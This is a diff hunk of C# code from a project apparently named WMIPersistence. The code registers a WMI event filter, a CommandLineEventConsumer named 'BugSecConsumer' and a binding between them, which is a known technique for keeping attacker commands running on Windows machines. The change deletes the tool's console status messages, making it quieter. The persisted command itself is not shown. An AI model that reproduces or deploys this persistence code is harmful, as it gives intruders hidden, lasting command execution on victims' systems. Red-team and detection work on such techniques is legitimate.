@@ -37,21 +37,17 @@ namespace WMIPersistence
         myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
         myEventFilter["EventNameSpace"] = @"\root\cimv2";
         myEventFilter.Put();
-        Console.WriteLine("[*] Event filter created.");
 
         myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
         myEventConsumer["Name"] = "BugSecConsumer";
         myEventConsumer["CommandLineTemplate"] = CommandLine;
         myEventConsumer.Put();
 
-        Console.WriteLine("[*] Event consumer created.");
-
         myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
         myBinder["Filter"] = myEventFilter.Path.RelativePath;
         myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
         myBinder.Put();
 
-        Console.WriteLine("[*] Subscription created");
       }
       catch (Exception e)
       {
